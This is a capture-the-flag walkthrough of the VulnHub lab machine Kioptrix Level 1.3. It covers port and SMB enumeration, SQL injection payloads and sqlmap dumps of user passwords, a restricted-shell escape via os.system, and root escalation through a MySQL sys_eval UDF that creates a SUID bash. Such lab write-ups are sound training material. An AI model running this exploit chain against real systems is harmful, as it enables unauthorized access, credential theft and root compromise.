## Machine Info

- **Name**: Kioptrix: Level 1.3 (#4)
- **Date release**: 8 Feb 2012
- **Author**: [Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)
- **Series**: [Kioptrix](https://www.vulnhub.com/series/kioptrix,8/)
- **Web page**: http://www.kioptrix.com/blog/?p=604
- **Vulnhub**: [Kioptrix: Level 1.3 (#4) ~ VulnHub](https://www.vulnhub.com/entry/kioptrix-level-13-4%2C25/)

## PWK

### recon

- `$ sudo nmap -sT -sV -sC -O -p22,80,139,445 $IP -oA nmap/detail`

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-16 14:05 CST
Nmap scan report for 192.168.123.93
Host is up (0.00072s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open              Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:A9:40:2B (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.12 - 2.6.14 (embedded), Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 10h29m59s, deviation: 3h32m07s, median: 7h59m59s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2023-11-16T09:05:23-05:00
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

### exploit

#### 139, 445 - smb

- file leakage, `$ smbmap -H $IP`, no access [x]

```
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.123.93:445      Name: 192.168.123.93            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Kioptrix4 server (Samba, Ubuntu))
```

- `enum4linux $IP`, get **4 usernames** (**seek password if possible**):
  - root
  - robert
  - john
  - loneferret

```
[+] Got OS info for 192.168.123.93 from srvinfo:
        KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x809a03


[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\loneferret (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)

user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]
```

- smb version using metasploit: **Samba 3.0.28a**

```
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.123.93:445    - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 192.168.123.93:445    -   Host could not be identified: Unix (Samba 3.0.28a)
[*] 192.168.123.93:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### image source checking

nothing special here.

- http://192.168.123.93/images/cartoon_goat.png
- `$ exiftool cartoon_goat.png`
- `$ binwalk cartoon_goat.png`

#### 80 - http

- path recon: `$ sudo gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.123.93
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 356] [--> http://192.168.123.93/images/]
/index                (Status: 200) [Size: 1255]
/member               (Status: 302) [Size: 220] [--> index.php]
/logout               (Status: 302) [Size: 0] [--> index.php]
/john                 (Status: 301) [Size: 354] [--> http://192.168.123.93/john/]
/robert               (Status: 301) [Size: 356] [--> http://192.168.123.93/robert/]
/server-status        (Status: 403) [Size: 334]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

- sensitive data leakage:
  - http://192.168.123.93/database.sql
  - username **john** in database X table **members**
  - column_name: id, username, password -> **sqli** (next procedure)

```
CREATE TABLE `members` (
`id` int(4) NOT NULL auto_increment,
`username` varchar(65) NOT NULL default '',
`password` varchar(65) NOT NULL default '',
PRIMARY KEY (`id`)
) TYPE=MyISAM AUTO_INCREMENT=2 ;

-- 
-- Dumping data for table `members`
-- 

INSERT INTO `members` VALUES (1, 'john', '1234');
```

#### sqli

- find the injection point

![image-20231116210727905](./KIOPTRIX%20LEVEL%201.3%20(4).assets/image-20231116210727905.png)

- copy packet data into local machine and use sqlmap to exp
  - validate sqli
  - dump username and password
    - `john:MyNameIsJohn`
    - `robert:ADGAdsafdfwt4gadfga==`

```
$ cat post.txt
POST /checklogin.php HTTP/1.1
Host: 192.168.123.93
Content-Length: 56
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.123.93
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.123.93/index.php?
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

myusername=admin&mypassword=admin&Submit=Login
```

```
$ sqlmap -r post.txt --batch --level 5

sqlmap identified the following injection point(s) with a total of 1464 HTTP(s) requests:
---
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: myusername=admin&mypassword=admin' AND 2376=(SELECT (CASE WHEN (2376=2376) THEN 2376 ELSE (SELECT 2392 UNION SELECT 5042) END))-- -&Submit=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: myusername=admin&mypassword=admin' AND (SELECT 8032 FROM (SELECT(SLEEP(5)))RhUh)-- GqgT&Submit=Login
---
```

```
$ sqlmap -r post.txt --batch --level 3 --dbs
available databases [3]:
[*] information_schema
[*] members
[*] mysql

$ sqlmap -r post.txt --batch --level 3 -D members --tables
Database: members
[1 table]
+---------+
| members |
+---------+

$ sqlmap -r post.txt --batch --level 3 -D members -T members --dump
Database: members
Table: members
[2 entries]
+----+-----------------------+----------+
| id | password              | username |
+----+-----------------------+----------+
| 1  | MyNameIsJohn          | john     |
| 2  | ADGAdsafdfwt4gadfga== | robert   |
+----+-----------------------+----------+
```

- login page ok, nothing special in html source code
- guess passwords also can login by **ssh**

![image-20231116211033880](./KIOPTRIX%20LEVEL%201.3%20(4).assets/image-20231116211033880.png)

- ssh login ok, `$ ssh -oHostKeyAlgorithms=ssh-rsa john@$IP`
- get a restricted shell

```
john@192.168.123.93's password:
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
john:~$

john:~$ ll
total 0
john:~$ ls
john:~$ cd ..
*** forbidden path -> "/home/"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
john:~$ ls
john:~$ ll
total 0
john:~$ lpath
Allowed:
 /home/john
john:~$ echo a shell
a shell
john:~$ sudo -l
*** forbidden sudo -> sudo -l
john:~$
```

### priv-esca

#### bypass restricted shell

If the restricted shell is implemented by python, commands might be writted like:

- os.system()
- os.popen()
- subprocess.popen()
- subprocess.call()
- subprocess.run()
- subprocess.getstatusoutput()

So, construct similar expression to execute unallowed commands on Linux:

```
john:~$ ls os.system('id')
uid=1001(john) gid=1001(john) groups=1001(john)
sh: Syntax error: "(" unexpected
john:~$ ls os.system('bash')
john@Kioptrix4:~$
```

#### enum

- basic info of machine

```
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
john@Kioptrix4:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:a9:40:2b brd ff:ff:ff:ff:ff:ff
    inet 192.168.123.93/24 brd 192.168.123.255 scope global eth1
john@Kioptrix4:~$ uname -a
Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
john@Kioptrix4:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04.3 LTS"
john@Kioptrix4:~$
```

- sudo, suid, guid [x]

```
john@Kioptrix4:~$ sudo -l
[sudo] password for john:
Sorry, user john may not run sudo on Kioptrix4.
john@Kioptrix4:~$ find / -type f -perm -u=s 2>/dev/null
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/sudoedit [x]
/usr/bin/chfn
/usr/bin/arping
/usr/bin/gpasswd
/usr/bin/mtr
/usr/bin/passwd
/usr/bin/at
/usr/sbin/pppd
/usr/sbin/uuidd
/lib/dhcp3-client/call-dhclient-script
/bin/mount
/bin/ping6
/bin/fusermount
/bin/su
/bin/ping
/bin/umount
/sbin/umount.cifs
/sbin/mount.cifs
```

- crontab [x]
- kernel priv esca (not tried)

```
$ searchsploit linux kernel ubuntu 2.6.24 Priv
Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - 'set_selection()' UTF-8 Off-by-One Privi | linux_x86-64/local/9083.c
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation (1)                                            | linux_x86/local/15916.c
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privilege Escalation (2)                                        | linux/local/15944.c
Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation                                             | linux/local/14814.c
Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Escalation                                                 | linux/local/17787.c
Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation                                              | linux_x86-64/local/34134.c
Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalation                                    | linux_x86-64/local/44299.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                        | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                               | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                    | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)            | linux/local/47169.c
```

- process, listen-state port
  - `$ ps -ef | grep mysql`
  - `netstat -tunlp`
  - find <font color='red'>**mysql**</font> availabe, <font color='red'>**root**</font> priv

```
john@Kioptrix4:~$ ps -ef | grep mysql
root      5137     1  0 15:02 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      5179  5137  0 15:02 ?        00:00:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-exter
root      5180  5137  0 15:02 ?        00:00:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
john      5449  5412  0 15:59 pts/0    00:00:00 grep mysql
john@Kioptrix4:~$ netstat -tunlp
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
udp        0      0 192.168.123.93:137      0.0.0.0:*                           -
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -
udp        0      0 192.168.123.93:138      0.0.0.0:*                           -
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

#### mysql - udf

- validate lib_mysqludf_sys.so file
- validate usefull config: **secure_file_priv**

```
robert@Kioptrix4:/$ whereis lib_mysqludf_sys.so
lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
robert@Kioptrix4:/$ # mysql udf installed: yes
robert@Kioptrix4:/$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 34526
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show global variables like '%secure%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_auth      | OFF   |
| secure_file_priv |       |
+------------------+-------+
2 rows in set (0.00 sec)

mysql> select @@version;
+--------------------+
| @@version          |
+--------------------+
| 5.0.51a-3ubuntu5.4 |
+--------------------+
1 row in set (0.00 sec)
```

- create udf: **sys_eval** by lib_mysqludf_sys.so
- copy bash shell into /tmp dir, set **suid** to **/tmp/rbash**

```
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create function sys_eval returns string soname 'lib_mysqludf_sys.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select sys_eval('id');
+--------------------------+
| sys_eval('id')           |
+--------------------------+
| uid=0(root) gid=0(root)
 |
+--------------------------+
1 row in set (0.00 sec)

mysql> select sys_eval('cp /bin/bash /tmp/rbash; chmod +xs /tmp/rbash');
+-----------------------------------------------------------+
| sys_eval('cp /bin/bash /tmp/rbash; chmod +xs /tmp/rbash') |
+-----------------------------------------------------------+
|                                                           |
+---------------------------------------
```

- run rbash on privileged mode -> get root

```
robert@Kioptrix4:/tmp$ ls
rbash
robert@Kioptrix4:/tmp$ ./rbash -p
rbash-3.2# id
uid=1002(robert) gid=1002(robert) euid=0(root) egid=0(root) groups=1002(robert)
rbash-3.2# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:a9:40:2b brd ff:ff:ff:ff:ff:ff
    inet 192.168.123.93/24 brd 192.168.123.255 scope global eth1
rbash-3.2# uname -a
Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
rbash-3.2$ cat congrats.txt
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret
```

- If no `lib_mysqludf_sys.so` exists, use this exp method: `$ searchsploit udf 5.0 -m 1518`

```
$ searchsploit udf 5.0
------------------------------------------------ ---------------------------------
 Exploit Title                                  |  Path
------------------------------------------------ ---------------------------------
MySQL 4.x/5.0 (Linux) - User-Defined Function ( | linux/local/1518.c
MySQL 4.x/5.0 (Windows) - User-Defined Function | windows/remote/3274.txt
------------------------------------------------ ---------------------------------
Shellcodes: No Results

 * Usage:
 * $ id
 * uid=500(raptor) gid=500(raptor) groups=500(raptor)
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> \! sh
 * sh-2.05b$ cat /tmp/out
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
```

